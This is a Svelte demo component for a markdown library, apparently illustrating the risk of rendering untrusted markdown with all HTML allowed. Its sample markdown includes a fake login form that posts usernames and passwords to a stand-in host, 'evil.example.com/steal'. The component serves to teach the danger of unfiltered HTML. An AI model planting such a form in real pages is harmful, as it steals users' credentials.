<script lang="ts">
    import SvelteMarkdown from '@humanspeak/svelte-markdown'

    const markdown = `## HTML Filtering Demo

This paragraph has **bold** and *italic* markdown formatting.

<div>
This is inside a trusted HTML div element.
</div>

<strong>HTML strong tag</strong> and <em>HTML em tag</em>.

<details>
<summary>Click to expand</summary>
Hidden content inside details/summary tags.
</details>

<iframe src="https://example.com" title="example iframe"></iframe>

<form action="https://evil.example.com/steal" method="POST">
  <strong>Fake login injected by untrusted markdown</strong>
  <input type="text" placeholder="Username" />
  <input type="password" placeholder="Password" />
  <button type="submit">Sign in</button>
</form>
`
</script>

<!--
  Allow-all HTML — no `renderers` override. Every HTML tag in the markdown
  source survives into the DOM. Iframes load, forms render, styles apply.
  Only safe with content you fully trust.
-->
<div class="hf-demo hf-demo-risk">
    <div class="hf-demo-bar">
        <span>POLICY / UNRESTRICTED</span>
        <span>trusted content only</span>
    </div>
    <div class="hf-demo-preview">
        <div class="hf-markdown prose prose-sm dark:prose-invert max-w-none">
            <SvelteMarkdown source={markdown} />
        </div>
    </div>
</div>

<style>
    .hf-demo {
        color: var(--brut-ink, currentColor);
        background:
            linear-gradient(135deg, var(--hf-wash), transparent 46%), var(--brut-bg, Canvas);
        border: 1px solid var(--brut-rule, rgba(127, 127, 127, 0.22));
        font-family: 'Inter Variable', 'Inter', system-ui, sans-serif;
    }
    .hf-demo-bar {
        display: flex;
        align-items: center;
        justify-content: space-between;
        gap: 12px;
        border-bottom: 1px solid var(--brut-rule, rgba(127, 127, 127, 0.22));
        padding: 9px 12px;
        color: var(--brut-ink-3, color-mix(in srgb, currentColor 58%, transparent));
        font-family: 'JetBrains Mono Variable', 'JetBrains Mono', ui-monospace, monospace;
        font-size: 11px;
        letter-spacing: 0.04em;
        text-transform: uppercase;
    }
    .hf-demo-bar span:first-child {
        color: var(--hf-accent);
        font-weight: 700;
    }
    .hf-demo-preview {
        padding: clamp(16px, 3vw, 28px);
    }
    .hf-markdown {
        color: var(--brut-ink-2, currentColor);
    }
    .hf-markdown :global(h2) {
        color: var(--brut-ink, currentColor);
        letter-spacing: 0;
    }
    .hf-markdown :global(div) {
        border: 1px solid var(--hf-accent-soft);
        background: var(--hf-surface);
        color: var(--brut-ink, currentColor);
        padding: 12px 14px;
    }
    .hf-markdown :global(details) {
        border: 1px solid var(--brut-rule, rgba(127, 127, 127, 0.22));
        background: var(--brut-bg-2, rgba(127, 127, 127, 0.06));
        padding: 12px 14px;
    }
    .hf-markdown :global(summary) {
        color: var(--hf-accent);
        cursor: pointer;
        font-weight: 700;
    }
    .hf-markdown :global(iframe) {
        width: 100%;
        min-height: 96px;
        border: 1px solid var(--hf-accent-soft);
        background: var(--hf-surface);
    }
    .hf-markdown :global(form) {
        display: grid;
        gap: 8px;
        border: 1px solid var(--hf-danger);
        background: var(--hf-danger-bg);
        padding: 14px;
    }
    .hf-markdown :global(form strong) {
        color: var(--hf-danger);
    }
    .hf-markdown :global(input) {
        width: 100%;
        border: 1px solid var(--brut-rule, rgba(127, 127, 127, 0.22));
        background: var(--brut-bg, Canvas);
        color: var(--brut-ink, currentColor);
        padding: 7px 9px;
    }
    .hf-markdown :global(button) {
        width: fit-content;
        border: 1px solid var(--hf-danger);
        background: var(--hf-danger);
        color: white;
        padding: 7px 12px;
        font-weight: 700;
    }
    .hf-demo-risk {
        --hf-accent: #dc2626;
        --hf-accent-soft: rgba(220, 38, 38, 0.34);
        --hf-danger: #b91c1c;
        --hf-danger-bg: rgba(254, 226, 226, 0.76);
        --hf-surface: rgba(254, 242, 242, 0.74);
        --hf-wash: rgba(220, 38, 38, 0.12);
    }
    :global(html.dark) .hf-demo-risk {
        --hf-accent: #f87171;
        --hf-accent-soft: rgba(248, 113, 113, 0.36);
        --hf-danger: #fb7185;
        --hf-danger-bg: rgba(127, 29, 29, 0.34);
        --hf-surface: rgba(127, 29, 29, 0.2);
        --hf-wash: rgba(248, 113, 113, 0.11);
    }
    @media (max-width: 640px) {
        .hf-demo-bar {
            align-items: flex-start;
            flex-direction: column;
        }
    }
</style>
